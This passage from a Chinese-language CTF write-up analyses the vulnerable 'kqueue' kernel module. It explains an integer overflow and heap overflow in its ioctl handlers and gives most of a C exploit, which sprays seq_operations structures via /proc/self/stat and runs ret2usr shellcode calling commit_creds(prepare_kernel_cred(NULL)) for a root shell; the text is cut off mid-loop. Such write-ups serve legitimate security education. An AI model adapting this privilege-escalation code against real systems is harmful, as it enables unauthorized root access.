code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">delete_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-comment">/* Check for out of bounds requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check for existence of the request kqueue */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] Requested kqueue does not exist&quot;</span>);<br><br>    kfree(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">queue</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">queue</span>-&gt;queue_size);<br>    kqueues[request.queue_idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="edit-kqueue"><a href="#edit-kqueue" class="headerlink" title="edit_kqueue"></a>edit_kqueue</h4><p>主要是从用户空间拷贝数据到指定 queue_entry-&gt;size，如果给的 entry_idx为 0 则拷到 queue-&gt;data</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">edit_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-comment">/* Check the idx of the kqueue */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if the kqueue exists at that idx */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue does not exist&quot;</span>);<br><br>    <span class="hljs-comment">/* Check the idx of the kqueue entry */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Get to the kqueue entry memory */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* Check for the existence of the kqueue entry */</span><br>    exists = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-built_in">queue</span>-&gt;max_entries+<span class="hljs-number">1</span>;i++)&#123;<br><br>        <span class="hljs-comment">/* If kqueue entry found , do the necessary */</span><br>        <span class="hljs-keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>            <span class="hljs-keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;<br>                validate(<span class="hljs-built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>                exists = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        kqueue_entry = kqueue_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx==<span class="hljs-number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>        validate(<span class="hljs-built_in">memcpy</span>(<span class="hljs-built_in">queue</span>-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!exists)<br>        <span class="hljs-keyword">return</span> NOT_EXISTS;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></div></td></tr></table></figure><h4 id="save-kqueue-entries"><a href="#save-kqueue-entries" class="headerlink" title="save_kqueue_entries"></a>save_kqueue_entries</h4><p>这个功能主要是分配一块现有 <code>queue-&gt;queue_size</code> 大小的 object 然后把 queue-&gt;data 与其所有 queue_entries-&gt;data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 <code>request.data_size</code> ，在这里很明显存在堆溢出</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br><br>    <span class="hljs-comment">/* Check for out of bounds queue_idx requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if queue is already saved or not */</span><br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br><br>    <span class="hljs-comment">/* Check if number of requested entries exceed the existing entries */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><br>    <span class="hljs-comment">/* Allocate memory for the kqueue to be saved */</span><br>    <span class="hljs-keyword">char</span> *new_queue = validate((<span class="hljs-keyword">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Each saved entry can have its own size */</span><br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Copy main&#x27;s queue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span><br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里有个全局数组标识一个 queue 是否 saved 了</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="hljs-literal">false</span>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="Step-I-整数溢出"><a href="#Step-I-整数溢出" class="headerlink" title="Step I.整数溢出"></a>Step I.整数溢出</h4><p>考虑到在 create_queue 中使用 <code>request.max_entries + 1</code> 来进行判定，因此我们可以传入 0xffffffff 使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 <code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p><h4 id="Step-II-堆溢出-堆喷射覆写-seq-operations-控制内核执行流"><a href="#Step-II-堆溢出-堆喷射覆写-seq-operations-控制内核执行流" class="headerlink" title="Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流"></a>Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流</h4><p>前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue-&gt;queue_size，即 0x18，应当从 <code>kmalloc-32</code> 中取，那么我们来考虑在该 slab 中可用的结构体</p><p>不难想到的是，<strong>seq_operations</strong> 这个结构体同样从 <code>kmalloc-32</code> 中分配，当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code> ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br>    <span class="hljs-keyword">void</span> (*stop) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>    <span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br>    <span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">seq_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><p>那么我们如何保证一定能够溢出到一个 <code>seq_operations</code> 呢？虽然说对于开启了 random freelist 保护（默认开启）的 kernel 而言我们无法直接得知分配的 object 对应的内存布局（<del>glibc这一点就做得很好，平整的内存布局可以让👴直接知道 Pwn 题里分配的每一个 chunk 的位置</del>），但我们可以使用<strong>堆喷射</strong>的手法在内核空间喷射足够多的 seq_operations 结构体布满 vulnerable object 所在的内存附近区域，从而保证我们能够溢出到其中之一</p><h4 id="Step-III-ret2usr-ret2shellcode"><a href="#Step-III-ret2usr-ret2shellcode" class="headerlink" title="Step III.ret2usr + ret2shellcode"></a>Step III.ret2usr + ret2shellcode</h4><p>由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道 prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行 <code>commit_creds(prepare_kernel_cred(NULL))</code></p><p>这里 ScuPax0s 师傅给出了一个美妙的解法：通过编写 <strong>shellcode</strong> 在内核栈上找恰当的数据以获得内核基址，执行<code>commit_creds(prepare_kernel_cred(NULL))</code> 并返回到用户态</p><h4 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h4><p>故最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">uint32_t</span>    max_entries;<br>    <span class="hljs-keyword">uint16_t</span>    data_size;<br>    <span class="hljs-keyword">uint16_t</span>    entry_idx;<br>    <span class="hljs-keyword">uint16_t</span>    queue_idx;<br>    <span class="hljs-keyword">char</span>*       data;<br>&#125;<span class="hljs-keyword">request_t</span>;<br><br><span class="hljs-keyword">long</span> dev_fd;<br><span class="hljs-keyword">size_t</span> root_rip;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">createQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> max_entries, <span class="hljs-keyword">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">editQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx,<span class="hljs-keyword">uint16_t</span> entry_idx,<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveQueue</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> queue_idx,<span class="hljs-keyword">uint32_t</span> max_entries,<span class="hljs-keyword">uint16_t</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span>**envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span>        seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-keyword">size_t</span>      *page;<br>    <span class="hljs-keyword">size_t</span>      data[<span class="hljs-number">0x20</span>];<br><br>    saveStatus();<br>    root_rip = (<span class="hljs-keyword">size_t</span>) getRootShell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>        data[i] = (<span class="hljs-keyword">size_t</span>) shellcode;<br><br>    createQueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; 